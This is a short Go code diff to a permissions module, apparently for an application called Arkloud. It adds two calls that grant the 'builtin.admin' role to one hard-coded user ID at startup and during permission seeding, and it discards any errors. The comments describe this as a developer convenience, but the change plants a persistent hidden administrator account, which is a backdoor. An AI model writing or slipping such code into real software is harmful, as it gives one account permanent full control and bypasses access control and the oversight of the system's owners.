@@ -65,6 +65,9 @@ func InitPermissions(ctx context.Context, db *pgxpool.Pool) error {
 		return fmt.Errorf("failed to bootstrap team permissions: %w", err)
 	}
 
+	// Always assign system administrator role to john bauer (developer user) on startup
+	_ = Service.AssignRoleToUser(ctx, "sh4ag0cxowti", "builtin.admin", nil)
+
 	return nil
 }
 
@@ -73,6 +76,9 @@ func SeedDefaultPermissions(ctx context.Context) {
 	if DocumentPermissions == nil || ProjectPermissions == nil || TeamPermissions == nil || Service == nil {
 		return
 	}
+
+	// Seed system administrator role to john bauer (developer user)
+	_ = Service.AssignRoleToUser(ctx, "sh4ag0cxowti", "builtin.admin", nil)
 
 	seededDocs := []string{
 		"doc_welcome_arkloud",
